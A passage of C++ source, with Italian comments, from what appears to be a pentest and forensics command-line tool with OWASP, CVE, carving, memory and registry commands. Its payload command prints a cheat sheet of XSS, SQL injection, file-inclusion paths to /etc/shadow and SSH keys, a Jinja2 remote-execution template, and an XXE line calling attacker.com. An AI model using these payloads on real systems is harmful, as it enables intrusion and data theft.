    if (diffs==0) std::cout<<Color::BGREEN<<"  ✅ File identici.\n"<<Color::RESET;
    else          std::cout<<Color::YELLOW<<"\n  Differenze trovate: "<<diffs<<"\n"<<Color::RESET;
    std::cout<<"\n";
}

// ─────────────────────────────────────────────
//  CMD: owasp — reference OWASP Top 10
// ─────────────────────────────────────────────
void cmdOwasp(const std::vector<std::string>& args) {
    std::cout << Color::CYAN << "\n  🛡  OWASP TOP 10 (2021) — Riferimento Rapido\n" << Color::RESET;
    std::cout << Color::DIM << "  " << std::string(65,'-') << "\n" << Color::RESET;

    struct OwaspItem { std::string id,name,desc,test; };
    std::vector<OwaspItem> items = {
        {"A01","Broken Access Control",
         "Utenti accedono a risorse/funzioni non autorizzate.",
         "Test: IDOR, privilege escalation, missing auth, CORS misconfiguration."},
        {"A02","Cryptographic Failures",
         "Dati sensibili in chiaro, algoritmi deboli (MD5/SHA1/RC4), no TLS.",
         "Test: traffico in chiaro, weak cipher, dati sensibili in log/URL."},
        {"A03","Injection",
         "SQLi, OS command injection, LDAP injection, XSS.",
         "Test: input non sanitizzato in query, comandi, parser XML/JSON."},
        {"A04","Insecure Design",
         "Architettura priva di threat modeling e principi di sicurezza.",
         "Test: business logic flaws, rate limiting assente, no defense in depth."},
        {"A05","Security Misconfiguration",
         "Default credentials, errori verbosi, servizi non necessari aperti.",
         "Test: header HTTP, default creds, directory listing, debug on."},
        {"A06","Vulnerable Components",
         "Dipendenze con CVE note, framework obsoleti.",
         "Test: version fingerprint, CVE check, SCA tools."},
        {"A07","Auth & Session Failures",
         "Password deboli, sessioni non invalidate, no MFA.",
         "Test: session fixation, token prediction, remember-me issues."},
        {"A08","Software & Data Integrity Failures",
         "No verifica firma aggiornamenti, insecure deserialization.",
         "Test: supply chain, unsigned packages, deserialization gadgets."},
        {"A09","Security Logging & Monitoring Failures",
         "Log assenti, alerting non funzionante, SIEM non configurato.",
         "Test: azioni senza log, no alert su errori massivi."},
        {"A10","Server-Side Request Forgery (SSRF)",
         "Server esegue richieste verso URL controllati dall'attaccante.",
         "Test: parametri URL, webhook, import da URL, PDF renderer."},
    };

    int n=0;
    for (auto& item:items) {
        std::cout << Color::BRED << "  [" << item.id << "] " << Color::BWHITE << item.name << Color::RESET << "\n";
        std::cout << Color::WHITE << "    " << item.desc << "\n";
        std::cout << Color::DIM   << "    " << item.test << "\n\n";
        if (args.size()>=2 && ++n==1 && toLower(args[1])=="--all") continue;
    }
    std::cout << Color::YELLOW << "  Ref: https://owasp.org/Top10\n" << Color::RESET << "\n";
}

// ─────────────────────────────────────────────
//  CMD: cve — reference CVE comuni per servizio
// ─────────────────────────────────────────────
void cmdCve(const std::vector<std::string>& args) {
    if (args.size() < 2) {
        std::cout << Color::YELLOW << "Uso: cve <servizio>  es: cve ssh | cve apache | cve smb | cve log4j\n" << Color::RESET; return;
    }
    std::string svc = toLower(args[1]);

    struct CveEntry { std::string id,cvss,desc,note; };
    std::map<std::string,std::vector<CveEntry>> db = {
        {"ssh",{
            {"CVE-2023-38408","9.8","OpenSSH ssh-agent RCE via PKCS#11","Agent forwarding — disabilitare se non usato"},
            {"CVE-2016-0777","7.4","OpenSSH roaming info leak (< 7.1p2)","Upgrade"},
            {"CVE-2008-5161","2.6","SSH CBC mode plaintext recovery","Usa CTR/GCM mode"},
            {"CVE-2018-15473","5.3","OpenSSH username enumeration","Patch OpenSSH >= 7.7"},
        }},
        {"apache",{
            {"CVE-2021-41773","7.5","Apache 2.4.49 path traversal / RCE","Urgente: patch a 2.4.51"},
            {"CVE-2021-42013","9.8","Apache 2.4.50 RCE (bypass patch precedente)","Patch immediata"},
            {"CVE-2017-7679","9.8","Apache mod_mime buffer overflow","Aggiorna Apache"},
            {"CVE-2014-0160","7.5","Heartbleed (OpenSSL usato da Apache)","Patch OpenSSL, rigenera cert"},
        }},
        {"smb",{
            {"CVE-2017-0144","9.8","EternalBlue — SMBv1 RCE (WannaCry/NotPetya)","Disabilita SMBv1 SUBITO"},
            {"CVE-2017-0145","9.8","EternalChampion — SMBv1 RCE","Patch MS17-010"},
            {"CVE-2020-0796","10.0","SMBGhost — SMBv3 RCE (Windows 10)","Patch KB4551762"},
            {"CVE-2021-44142","9.9","Samba vfs_fruit RCE (< 4.13.17)","Aggiorna Samba"},
        }},
        {"log4j",{
            {"CVE-2021-44228","10.0","Log4Shell — JNDI injection RCE (Log4j 2.x)","CRITICO: patch a 2.17.1"},
            {"CVE-2021-45046","9.0","Log4Shell bypass (incompleto fix iniziale)","Patch a 2.17.0+"},
            {"CVE-2021-45105","7.5","Log4j DoS via infinite recursion","Patch 2.17.0+"},
            {"CVE-2021-44832","6.6","Log4j RCE via attacker-controlled config","Patch 2.17.1+"},
        }},
        {"nginx",{
            {"CVE-2021-23017","7.7","Nginx DNS resolver buffer overflow","Patch 1.20.1"},
            {"CVE-2017-7529","7.5","Nginx range filter integer overflow info leak","Patch 1.11.13"},
            {"CVE-2013-2028","9.8","Nginx chunked encoding stack overflow","Versioni storiche"},
        }},
        {"mysql",{
            {"CVE-2012-2122","7.5","MySQL auth bypass (confronto hash)","Patch immediata"},
            {"CVE-2016-6662","9.8","MySQL config file injection RCE","Patch 5.7.15+"},
            {"CVE-2020-14765","6.5","MySQL DoS via subquery","Patch 8.0.22+"},
        }},
        {"rdp",{
            {"CVE-2019-0708","9.8","BlueKeep — RDP pre-auth RCE (W7/W2008)","URGENTE: patch MS19-0708"},
            {"CVE-2019-1181","9.8","DejaBlue — RDP RCE (W8/W10/W2012/W2016)","Patch agosto 2019"},
            {"CVE-2020-0609","9.8","RD Gateway RCE pre-auth","Patch gennaio 2020"},
        }},
    };

    std::cout << Color::CYAN << "\n  🚨 CVE REFERENCE: " << svc << "\n" << Color::RESET;
    std::cout << Color::DIM << "  " << std::string(65,'-') << "\n" << Color::RESET;

    if (!db.count(svc)) {
        std::cout << Color::YELLOW << "  Servizio non in database.\n  Disponibili: ssh, apache, smb, log4j, nginx, mysql, rdp\n" << Color::RESET; return;
    }
    for (auto& e : db[svc]) {
        float score = std::stof(e.cvss);
        std::string col = score>=9.0?Color::BRED:score>=7.0?Color::YELLOW:Color::GREEN;
        std::cout << col << "  [" << e.id << "]  CVSS " << e.cvss << Color::RESET << "\n";
        std::cout << Color::WHITE << "    " << e.desc << "\n";
        std::cout << Color::DIM   << "    ↳ " << e.note << "\n\n" << Color::RESET;
    }
    std::cout << Color::DIM << "  Verifica sempre su: https://nvd.nist.gov/vuln/search\n" << Color::RESET << "\n";
}

// ─────────────────────────────────────────────
//  CMD: payload — riferimento payload CTF/pentest
// ─────────────────────────────────────────────
void cmdPayload(const std::vector<std::string>& args) {
    if (args.size() < 2) {
        std::cout << Color::YELLOW << "Uso: payload <tipo>\n"
                  << "  Tipi: xss, sqli, lfi, xxe, ssti, redirect, headers\n" << Color::RESET; return;
    }
    std::string type=toLower(args[1]);

    std::cout << Color::CYAN << "\n  💡 PAYLOAD REFERENCE [" << type << "]\n" << Color::RESET;
    std::cout << Color::DIM << "  Solo per uso su sistemi autorizzati / CTF / lab.\n" << Color::RESET;
    std::cout << Color::DIM << "  " << std::string(60,'-') << "\n" << Color::RESET;

    if (type=="xss") {
        std::vector<std::pair<std::string,std::string>> payloads = {
            {"Basic","<script>alert(1)</script>"},
            {"img onerror","<img src=x onerror=alert(1)>"},
            {"SVG","<svg onload=alert(1)>"},
            {"Input","<input autofocus onfocus=alert(1)>"},
            {"Encoded","&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;"},
            {"JS proto","javascript:alert(1)"},
            {"Template","{{7*7}} (template injection test)"},
        };
        for (auto& [n,p]:payloads)
            std::cout<<Color::YELLOW<<"  ["<<std::setw(12)<<n<<"] "<<Color::WHITE<<p<<"\n"<<Color::RESET;
    } else if (type=="sqli") {
        std::vector<std::pair<std::string,std::string>> payloads = {
            {"Boolean","' OR '1'='1"},
            {"Boolean2","' OR 1=1 --"},
            {"Comment","admin'--"},
            {"Union 2col","' UNION SELECT null,null --"},
            {"Version","' UNION SELECT @@version,null --"},
            {"Error-based","' AND extractvalue(1,concat(0x7e,version())) --"},
            {"Stacked","'; DROP TABLE users --"},
            {"Time-based","' AND SLEEP(5) --"},
            {"Blind","' AND 1=1 -- (true) / ' AND 1=2 -- (false)"},
        };
        for (auto& [n,p]:payloads)
            std::cout<<Color::YELLOW<<"  ["<<std::setw(12)<<n<<"] "<<Color::WHITE<<p<<"\n"<<Color::RESET;
    } else if (type=="lfi") {
        std::vector<std::pair<std::string,std::string>> payloads = {
            {"Basic","../../../etc/passwd"},
            {"URL encoded","..%2F..%2F..%2Fetc%2Fpasswd"},
            {"Double encode","..%252F..%252Fetc%252Fpasswd"},
            {"Null byte","../../../etc/passwd%00"},
            {"Shadow","/etc/shadow"},
            {"SSH keys","/home/user/.ssh/id_rsa"},
            {"Log poison","/var/log/apache2/access.log"},
            {"PHP wrapper","php://filter/convert.base64-encode/resource=index.php"},
            {"Proc environ","/proc/self/environ"},
        };
        for (auto& [n,p]:payloads)
            std::cout<<Color::YELLOW<<"  ["<<std::setw(14)<<n<<"] "<<Color::WHITE<<p<<"\n"<<Color::RESET;
    } else if (type=="xxe") {
        std::cout << Color::WHITE <<
R"(  Classic XXE:
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <root>&xxe;</root>

  OOB (Out-Of-Band):
  <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/x.dtd">%xxe;]>

  SSRF via XXE:
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
)" << Color::RESET;
    } else if (type=="ssti") {
        std::vector<std::pair<std::string,std::string>> payloads = {
            {"Jinja2/Twig","{{7*7}} → 49"},
            {"Jinja2 RCE","{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"},
            {"FreeMarker","${7*7}"},
            {"Velocity","#set($x=7*7)$x"},
            {"Smarty","{php}echo `id`;{/php}"},
            {"ERB (Ruby)","<%= 7*7 %>"},
            {"Pebble","{{7*7}}"},
        };
        for (auto& [n,p]:payloads)
            std::cout<<Color::YELLOW<<"  ["<<std::setw(14)<<n<<"] "<<Color::WHITE<<p<<"\n"<<Color::RESET;
    } else if (type=="redirect") {
        std::vector<std::pair<std::string,std::string>> payloads = {
            {"Basic","//evil.com"},
            {"Protocol","javascript:alert(1)"},
            {"CRLF","url%0d%0aLocation:http://evil.com"},
            {"Unicode","http://evil．com"},
            {"Double slash","////evil.com"},
        };
        for (auto& [n,p]:payloads)
            std::cout<<Color::YELLOW<<"  ["<<std::setw(14)<<n<<"] "<<Color::WHITE<<p<<"\n"<<Color::RESET;
    } else if (type=="headers") {
        std::vector<std::pair<std::string,std::string>> headers = {
            {"Bypass IP","X-Forwarded-For: 127.0.0.1"},
            {"Real IP","X-Real-IP: 127.0.0.1"},
            {"Client IP","X-Client-IP: 127.0.0.1"},
            {"Host spoof","Host: internal.target.com"},
            {"Auth bypass","Authorization: null"},
            {"Method override","X-HTTP-Method-Override: PUT"},
            {"Content-Type","Content-Type: application/json; charset=UTF-8"},
        };
        for (auto& [n,p]:headers)
            std::cout<<Color::YELLOW<<"  ["<<std::setw(14)<<n<<"] "<<Color::WHITE<<p<<"\n"<<Color::RESET;
    } else {
        std::cout << Color::RED << "  Tipo non riconosciuto.\n" << Color::RESET;
    }
    std::cout << "\n";
}

// ─────────────────────────────────────────────
//  CMD: network — info rete locale
// ─────────────────────────────────────────────
#include <ifaddrs.h>
void cmdNetwork(const std::vector<std::string>&) {
    std::cout << Color::CYAN << "\n  🌐 INTERFACCE DI RETE\n" << Color::RESET;
    std::cout << Color::DIM << "  " << std::string(60,'-') << "\n" << Color::RESET;

    struct ifaddrs* ifap=nullptr;
    if (getifaddrs(&ifap)!=0) { std::cout<<Color::RED<<"  Impossibile ottenere interfacce.\n"<<Color::RESET; return; }
    for (auto* ifa=ifap; ifa; ifa=ifa->ifa_next) {
        if (!ifa->ifa_addr) continue;
        std::string name=ifa->ifa_name;
        if (ifa->ifa_addr->sa_family==AF_INET) {
            char ip[INET_ADDRSTRLEN], mask[INET_ADDRSTRLEN];
            inet_ntop(AF_INET,&((struct sockaddr_in*)ifa->ifa_addr)->sin_addr,ip,sizeof(ip));
            inet_ntop(AF_INET,&((struct sockaddr_in*)ifa->ifa_netmask)->sin_addr,mask,sizeof(mask));
            std::cout<<Color::YELLOW<<"  "<<std::left<<std::setw(12)<<name
                     <<Color::GREEN<<std::setw(18)<<ip<<Color::DIM<<" mask "<<mask<<"\n"<<Color::RESET;
        } else if (ifa->ifa_addr->sa_family==AF_INET6) {
            char ip[INET6_ADDRSTRLEN];
            inet_ntop(AF_INET6,&((struct sockaddr_in6*)ifa->ifa_addr)->sin6_addr,ip,sizeof(ip));
            std::cout<<Color::YELLOW<<"  "<<std::left<<std::setw(12)<<name
                     <<Color::CYAN<<ip<<Color::DIM<<" (IPv6)\n"<<Color::RESET;
        }
    }
    freeifaddrs(ifap);
    char host[256]; gethostname(host,sizeof(host));
    std::cout<<Color::YELLOW<<"\n  Hostname: "<<Color::WHITE<<host<<Color::RESET<<"\n\n";
}

// ─────────────────────────────────────────────
//  CMD: sysinfo — informazioni sistema
// ─────────────────────────────────────────────
#include <sys/utsname.h>
#include <sys/resource.h>
void cmdSysInfo(const std::vector<std::string>&) {
    std::cout << Color::CYAN << "\n  💻 SYSTEM INFO\n" << Color::RESET;
    std::cout << Color::DIM << "  " << std::string(60,'-') << "\n" << Color::RESET;

    struct utsname uts;
    if (uname(&uts)==0) {
        std::cout<<Color::YELLOW<<"  OS           : "<<Color::WHITE<<uts.sysname<<" "<<uts.release<<"\n";
        std::cout<<Color::YELLOW<<"  Version      : "<<Color::WHITE<<uts.version<<"\n";
        std::cout<<Color::YELLOW<<"  Machine      : "<<Color::WHITE<<uts.machine<<"\n";
        std::cout<<Color::YELLOW<<"  Node         : "<<Color::WHITE<<uts.nodename<<"\n";
    }
    char cwd[512]; if(getcwd(cwd,sizeof(cwd))) std::cout<<Color::YELLOW<<"  Working dir  : "<<Color::WHITE<<cwd<<"\n";
    std::cout<<Color::YELLOW<<"  UID/GID      : "<<Color::WHITE<<getuid()<<"/"<<getgid();
    if(getuid()==0) std::cout<<Color::BRED<<" (ROOT!)"<<Color::RESET;
    std::cout<<"\n";
    std::cout<<Color::YELLOW<<"  PID          : "<<Color::WHITE<<getpid()<<"\n";
    // Env vars interessanti
    std::vector<std::string> envVars={"PATH","HOME","SHELL","TERM","USER","SUDO_USER","LD_PRELOAD","LD_LIBRARY_PATH"};
    std::cout<<Color::YELLOW<<"\n  Variabili ambiente rilevanti:\n"<<Color::RESET;
    for (auto& v:envVars) {
        char* val=getenv(v.c_str());
        if(val) {
            bool sensitive=(v=="LD_PRELOAD"||v=="LD_LIBRARY_PATH");
            std::cout<<"  "<<Color::DIM<<std::setw(18)<<v<<" = "
                     <<(sensitive?Color::BRED:Color::WHITE)<<val<<Color::RESET<<"\n";
        }
    }
    std::cout<<"\n";
}

// ═══════════════════════════════════════════════════════════════
//  CMD: carve — file carving avanzato
// ═══════════════════════════════════════════════════════════════
void cmdCarve(const std::vector<std::string>& args) {
    if (args.size() < 2) {
        std::cout << Color::YELLOW << "Uso: carve <file> [--out <dir>]\n"
                  << "  Estrae file embedded tramite magic bytes signature\n" << Color::RESET;
        return;
    }
    std::string path = args[1];
    std::string outDir = ".";
    for (size_t i = 2; i < args.size(); i++)
        if (args[i] == "--out" && i+1 < args.size()) outDir = args[++i];

    std::ifstream f(path, std::ios::binary);
    if (!f) { std::cout << Color::RED << "  File non trovato: " << path << Color::RESET << "\n"; return; }

    f.seekg(0, std::ios::end);
    size_t fsize = f.tellg(); f.seekg(0);
    std::vector<uint8_t> data(fsize);
    f.read((char*)data.data(), fsize);

    std::cout << Color::CYAN << "\n  FILE CARVING: " << path
              << Color::DIM << " (" << humanSize(fsize) << ")\n" << Color::RESET;
    std::cout << Color::DIM << "  Output: " << outDir << "\n";
    std::cout << "  " << std::string(60,'-') << "\n" << Color::RESET;

    struct CarveSig {
        std::vector<uint8_t> header;
        std::vector<uint8_t> footer;
        std::string ext;
        size_t maxSize;
    };

    std::vector<CarveSig> sigs = {
        {{0xFF,0xD8,0xFF}, {0xFF,0xD9}, ".jpg", 10*1024*1024},
        {{0x89,0x50,0x4E,0x47,0x0D,0x0A,0x1A,0x0A}, {0x49,0x45,0x4E,0x44,0xAE,0x42,0x60,0x82}, ".png", 10*1024*1024},
        {{0x47,0x49,0x46,0x38}, {0x00,0x3B}, ".gif", 5*1024*1024},
        {{0x25,0x50,0x44,0x46}, {0x25,0x25,0x45,0x4F,0x46}, ".pdf", 50*1024*1024},
        {{0x50,0x4B,0x03,0x04}, {0x50,0x4B,0x05,0x06}, ".zip", 100*1024*1024},
        {{0x52,0x61,0x72,0x21,0x1A,0x07}, {}, ".rar", 100*1024*1024},
        {{0x7F,0x45,0x4C,0x46}, {}, ".elf", 50*1024*1024},
        {{0x4D,0x5A}, {}, ".exe", 50*1024*1024},
        {{0x52,0x49,0x46,0x46}, {}, ".wav", 50*1024*1024},
        {{0x1F,0x8B,0x08}, {}, ".gz", 100*1024*1024},
        {{0x53,0x51,0x4C,0x69,0x74,0x65}, {}, ".db", 100*1024*1024},
    };

    mkdir(outDir.c_str(), 0755);
    int found = 0;

    for (auto& sig : sigs) {
        for (size_t i = 0; i + sig.header.size() < fsize; i++) {
            // Cerca header
            bool match = true;
            for (size_t j = 0; j < sig.header.size(); j++)
                if (data[i+j] != sig.header[j]) { match=false; break; }
            if (!match) continue;

            // Trova fine
            size_t end = std::min(fsize, i + sig.maxSize);
            if (!sig.footer.empty()) {
                for (size_t k = i + sig.header.size(); k + sig.footer.size() < fsize && k < i + sig.maxSize; k++) {
                    bool fm = true;
                    for (size_t j = 0; j < sig.footer.size(); j++)
                        if (data[k+j] != sig.footer[j]) { fm=false; break; }
                    if (fm) { end = k + sig.footer.size(); break; }
                }
            }

            // Salva file estratto
            std::string outPath = outDir + "/carved_" + std::to_string(found) + "_0x" +
                [&]{ std::ostringstream o; o<<std::hex<<i; return o.str(); }() + sig.ext;
            std::ofstream out(outPath, std::ios::binary);
            if (out) {
                out.write((char*)data.data()+i, end-i);
                found++;
                std::cout << Color::GREEN << "  [" << std::setw(3) << found << "] "
                          << Color::WHITE << sig.ext << "  offset=0x" << std::hex << i
                          << "  size=" << std::dec << humanSize(end-i)
                          << Color::DIM << "  -> " << outPath << Color::RESET << "\n";
            }
            i = end;
        }
    }

    if (found == 0) std::cout << Color::DIM << "  Nessun file trovato.\n" << Color::RESET;
    else std::cout << Color::YELLOW << "\n  File estratti: " << found << " in " << outDir << Color::RESET << "\n";
    std::cout << "\n";
}

// ═══════════════════════════════════════════════════════════════
//  CMD: memory — analisi dump RAM
// ═══════════════════════════════════════════════════════════════
void cmdMemory(const std::vector<std::string>& args) {
    if (args.size() < 2) {
        std::cout << Color::YELLOW << "Uso: memory <dump.mem> [--strings] [--ips] [--urls] [--emails] [--hashes]\n"
                  << "     memory live   (info RAM sistema corrente)\n" << Color::RESET;
        return;
    }

    if (toLower(args[1]) == "live") {
        std::cout << Color::CYAN << "\n  RAM SISTEMA\n" << Color::RESET;
        std::cout << Color::DIM << "  " << std::string(50,'-') << "\n" << Color::RESET;
#ifdef __APPLE__
        FILE* p = popen("vm_stat 2>/dev/null", "r");
        if (p) { char buf[512]; while(fgets(buf,sizeof(buf),p)) std::cout<<"  "<<buf; pclose(p); }
        p = popen("sysctl hw.memsize 2>/dev/null", "r");
        if (p) { char buf[128]={0}; fgets(buf,sizeof(buf),p); pclose(p);
            long bytes=0; sscanf(buf,"hw.memsize: %ld",&bytes);
            std::cout<<Color::YELLOW<<"  Totale RAM: "<<Color::WHITE<<humanSize(bytes)<<Color::RESET<<"\n"; }
#else
        FILE* p = popen("free -h 2>/dev/null", "r");
        if (p) { char buf[256]; while(fgets(buf,sizeof(buf),p)) std::cout<<"  "<<buf; pclose(p); }
#endif
        std::cout << "\n"; return;
    }

    std::string path = args[1];
    bool doStrings=false, doIps=false, doUrls=false, doEmails=false, doHashes=false;
    for (size_t i=2;i<args.size();i++) {
        if(args[i]=="--strings") doStrings=true;
        if(args[i]=="--ips")     doIps=true;
        if(args[i]=="--urls")    doUrls=true;
        if(args[i]=="--emails")  doEmails=true;
        if(args[i]=="--hashes")  doHashes=true;
        if(args[i]=="--all")     doStrings=doIps=doUrls=doEmails=doHashes=true;
    }
    if (!doStrings&&!doIps&&!doUrls&&!doEmails&&!doHashes) doIps=doUrls=doEmails=true;

    std::ifstream f(path, std::ios::binary);
    if (!f) { std::cout << Color::RED << "  File non trovato: " << path << Color::RESET << "\n\n"; return; }

    f.seekg(0, std::ios::end);
    size_t fsize = f.tellg(); f.seekg(0);

    std::cout << Color::CYAN << "\n  MEMORY ANALYSIS: " << path
              << Color::DIM << " (" << humanSize(fsize) << ")\n" << Color::RESET;
    std::cout << Color::DIM << "  " << std::string(60,'-') << "\n" << Color::RESET;

    // Analisi in blocchi per file grandi
    const size_t CHUNK = 4*1024*1024; // 4MB chunks
    std::string cur;
    std::set<std::string> ips, urls, emails, hashes;

    auto isIp = [](const std::string& s) {
        int a,b,c,d; char extra;
        return sscanf(s.c_str(),"%d.%d.%d.%d%c",&a,&b,&c,&d,&extra)==4 &&
               a>=0&&a<=255&&b>=0&&b<=255&&c>=0&&c<=255&&d>=0&&d<=255;
    };

    std::vector<char> buf(CHUNK);
    size_t totalRead = 0;
    while (totalRead < fsize) {
        size_t toRead = std::min(CHUNK, fsize - totalRead);
        f.read(buf.data(), toRead);
        size_t n = f.gcount();
        totalRead += n;

        for (size_t i = 0; i < n; i++) {
            char c = buf[i];
            if (c >= 32 && c <= 126) cur += c;
            else {
                if (cur.size() >= 6) {
                    // IP
                    if (doIps && cur.size()>=7 && cur.size()<=15) {
                        if (isIp(cur)) ips.insert(cur);
                    }
                    // URL
                    if (doUrls && (cur.find("http://")!=std::string::npos || cur.find("https://")!=std::string::npos))
                        urls.insert(cur.substr(0,120));
                    // Email
                    if (doEmails) {
                        auto at = cur.find('@');
                        if (at!=std::string::npos && at>0 && at<cur.size()-3)
                            emails.insert(cur.substr(0,80));
                    }
                    // Hash MD5/SHA
                    if (doHashes && (cur.size()==32||cur.size()==40||cur.size()==64)) {
                        bool isHex=true;
                        for(char hc:cur) if(!isxdigit(hc)){isHex=false;break;}
                        if(isHex) hashes.insert(cur);
                    }
                }
                cur.clear();
            }
        }
    }

    if (doIps && !ips.empty()) {
        std::cout << Color::YELLOW << "\n  IP TROVATI (" << ips.size() << "):\n" << Color::RESET;
        for(auto& ip:ips) {
            // Filtra IP privati/loopback
            bool priv = (ip.find("192.168.")==0||ip.find("10.")==0||
                        ip.find("172.")==0||ip.find("127.")==0||ip=="0.0.0.0");
            std::cout << (priv?Color::DIM:Color::GREEN) << "  " << ip
                      << (priv?" (privato/locale)":"") << Color::RESET << "\n";
        }
    }
    if (doUrls && !urls.empty()) {
        std::cout << Color::YELLOW << "\n  URL TROVATI (" << urls.size() << "):\n" << Color::RESET;
        for(auto& u:urls) std::cout<<Color::CYAN<<"  "<<u<<Color::RESET<<"\n";
    }
    if (doEmails && !emails.empty()) {
        std::cout << Color::YELLOW << "\n  EMAIL TROVATE (" << emails.size() << "):\n" << Color::RESET;
        for(auto& e:emails) std::cout<<Color::WHITE<<"  "<<e<<Color::RESET<<"\n";
    }
    if (doHashes && !hashes.empty()) {
        std::cout << Color::YELLOW << "\n  HASH TROVATI (" << hashes.size() << "):\n" << Color::RESET;
        for(auto& h:hashes) {
            std::string type = h.size()==32?"MD5":h.size()==40?"SHA-1":"SHA-256";
            std::cout<<Color::GREEN<<"  ["<<type<<"] "<<h<<Color::RESET<<"\n";
        }
    }
    std::cout << "\n";
}

// ═══════════════════════════════════════════════════════════════
//  CMD: registry — analisi registry Windows (file hive)
// ═══════════════════════════════════════════════════════════════
void cmdRegistry(const std::vector<std::string>& args) {
    if (args.size() < 2) {
        std::cout << Color::YELLOW << "Uso: registry <hivefile>\n"
                  << "  Analizza file hive del registry Windows\n"
                  << "  File comuni: SYSTEM, SAM, SECURITY, SOFTWARE, NTUSER.DAT\n" << Color::RESET;
        return;
    }
    std::string path = args[1];
    std::ifstream f(path, std::ios::binary);
    if (!f) { std::cout << Color::RED << "  File non trovato: " << path << Color::RESET << "\n\n"; return; }

    // Legge magic bytes
    uint8_t hdr[4] = {0};
    f.read((char*)hdr, 4);

    std::cout << Color::CYAN << "\n  REGISTRY ANALYSIS: " << path << "\n" << Color::RESET;
    std::cout << Color::DIM << "  " << std::string(60,'-') << "\n" << Color::RESET;

    // Verifica magic "regf"
    bool isHive = (hdr[0]=='r'&&hdr[1]=='e'&&hdr[2]=='g'&&hdr[3]=='f');
    std::cout << Color::YELLOW << "  Tipo file   : " << Color::WHITE
              << (isHive ? "Windows Registry Hive (regf)" : "Non riconosciuto come hive standard") << "\n" << Color::RESET;

    struct stat st; stat(path.c_str(), &st);
    std::cout << Color::YELLOW << "  Dimensione  : " << Color::WHITE << humanSize(st.st_size) << "\n";
    std::cout << Color::YELLOW << "  Modificato  : " << Color::WHITE << timeStr(st.st_mtime) << "\n";

    // Cerca stringhe interessanti nel file
    f.seekg(0);
    std::string cur;
    std::set<std::string> interesting;
    std::vector<std::string> keywords = {
        "password","passwd","pwd","secret","token","key","admin",
        "user","login","http","https","\\Software\\","\\System\\",
        "RunOnce","CurrentVersion","Winlogon","SAM","SECURITY"
    };
    char c;
    while (f.get(c)) {
        if (c>=32&&c<=126) cur+=c;
        else {
            if (cur.size()>=6) {
                std::string low = toLower(cur);
                for (auto& kw : keywords)
                    if (low.find(toLower(kw))!=std::string::npos) {
                        interesting.insert(cur.substr(0,100));
                        break;
                    }
            }
            cur.clear();
        }
    }

    if (!interesting.empty()) {
        std::cout << Color::YELLOW << "\n  STRINGHE INTERESSANTI (" << interesting.size() << "):\n" << Color::RESET;
        for (auto& s : interesting)
            std::cout << Color::WHITE << "  " << s << Color::RESET << "\n";
    }

    std::cout << Color::DIM << "\n  Tip: per analisi completa usa 'nex install' per installare regipy o hivex\n" << Color::RESET;
    std::cout << "\n";
}

// ═══════════════════════════════════════════════════════════════
//  CMD: netcap — cattura pacchetti live
// ═══════════════════════════════════════════════════════════════
void cmdNetcap(const std::vector<std::string>& args) {
    if (args.size() < 2) {
        std::cout << Color::YELLOW << "Uso: netcap <interfaccia> [--count N] [--filter <expr>] [--out file.pcap]\n"
                  << "     netcap list   (lista interfacce disponibili)\n" << Color::RESET;
        return;
    }

    if (toLower(args[1]) == "list") {
        std::cout << Color::CYAN << "\n  INTERFACCE DI RETE\n" << Color::RESET;
        std::cout << Color::DIM << "  " << std::string(50,'-') << "\n" << Color::RESET;
#ifdef __APPLE__
        FILE* p = popen("networksetup -listallhardwareports 2>/dev/null", "r");
#else
        FILE* p = popen("ip link show 2>/dev/null", "r");
#endif
        if (p) { char buf[256]; while(fgets(buf,sizeof(buf),p)) std::cout<<Color::WHITE<<"  "<<buf<<Color::RESET; pclose(p); }
        std::cout << "\n"; return;
    }

    std::string iface = args[1];
    int count = 20;
    std::string filter, outFile;
    for (size_t i=2;i<args.size();i++) {
        if(args[i]=="--count"&&i+1<args.size()) count=std::stoi(args[++i]);
        if(args[i]=="--filter"&&i+1<args.size()) filter=args[++i];
        if(args[i]=="--out"&&i+1<args.size()) outFile=args[++i];
    }

    std::cout << Color::CYAN << "\n  NETWORK CAPTURE: " << iface << "\n" << Color::RESET;
    std::cout << Color::DIM << "  " << std::string(55,'-') << "\n" << Color::RESET;

    // Usa tcpdump se disponibile
    std::string cmd = "tcpdump -i " + iface + " -c " + std::to_string(count) + " -nn -l";
    if (!filter.empty()) cmd += " '" + filter + "'";
    if (!outFile.empty()) cmd += " -w " + outFile;
    cmd += " 2>&1";

    std::cout << Color::DIM << "  $ " << cmd << "\n" << Color::RESET;
    std::cout << Color::YELLOW << "  (Premi Ctrl+C per fermare)\n\n" << Color::RESET;

    FILE* p = popen(cmd.c_str(), "r");
    if (!p) { std::cout << Color::RED << "  Errore. tcpdump installato?\n" << Color::RESET; return; }
    char buf[512];
    while (fgets(buf,sizeof(buf),p)) {
        std::string l(buf);
        if(l.find("IP")!=std::string::npos) std::cout<<Color::GREEN;
        else if(l.find("ARP")!=std::string::npos) std::cout<<Color::YELLOW;
        else if(l.find("ICMP")!=std::string::npos) std::cout<<Color::CYAN;
        else std::cout<<Color::WHITE;
        std::cout<<"  "<<l<<Color::RESET;
    }
    pclose(p);
    if (!outFile.empty())
        std::cout<<Color::BGREEN<<"  Salvato in: "<<outFile<<Color::RESET<<"\n";
    std::cout<<"\n";
}

// ═══════════════════════════════════════════════════════════════
//  CMD: custody — catena di custodia digitale
// ═══════════════════════════════════════════════════════════════
void cmdCustody(const std::vector<std::string>& args) {
    if (args.size() < 2) {
        std::cout << Color::YELLOW << "Uso: custody <sottocmd> [args]\n"
                  << "  custody new <file> <caso> <analista>   crea nuova catena\n"
                  << "  custody add <file> <azione> <note>     aggiungi evento\n"
                  << "  custody show <file>                    mostra catena\n"
                  << "  custody verify <file>                  verifica integrità\n" << Color::RESET;
        return;
    }
    std::string sub = toLower(args[1]);
    std::string logDir = std::string(getenv("HOME")?getenv("HOME"):".") + "/.nexus/custody";
    mkdir((std::string(getenv("HOME")?getenv("HOME"):".") + "/.nexus").c_str(), 0755);
    mkdir(logDir.c_str(), 0755);

    if (sub == "new" && args.size() >= 5) {
        std::string file = args[2], caso = args[3], analista = args[4];
        if (!fileExists(file)) { std::cout<<Color::RED<<"  File non trovato: "<<file<<Color::RESET<<"\n\n"; return; }

        // Calcola hash
